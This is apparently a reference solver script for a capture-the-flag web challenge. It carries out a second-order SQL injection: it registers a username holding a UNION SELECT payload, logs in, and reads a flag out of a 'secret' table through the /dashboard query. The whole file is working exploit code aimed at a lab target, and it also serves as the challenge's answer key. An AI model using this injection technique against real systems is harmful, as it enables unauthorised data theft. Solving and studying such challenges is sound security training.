#!/usr/bin/env python3
"""Reference solver for web-forum-sqli2 (second-order SQL injection).

Register a username that is a UNION payload; login (parameterised, matches the
stored row); open /dashboard, where the stored name is interpolated into SQL.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.parse
import urllib.request

PAYLOAD = "zzz' UNION SELECT flag FROM secret-- -"
PW = "pw123"


def get(base, path, **params):
    url = base.rstrip("/") + path + "?" + urllib.parse.urlencode(params)
    return json.loads(urllib.request.urlopen(url, timeout=10).read())


def solve(base):
    get(base, "/register", user=PAYLOAD, **{"pass": PW})
    sid = get(base, "/login", user=PAYLOAD, **{"pass": PW})["sid"]
    roles = get(base, "/dashboard", sid=sid)["roles"]
    for r in roles:
        if r and r.startswith("NCTF{"):
            return r
    raise SystemExit("flag not in result: %r" % roles)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
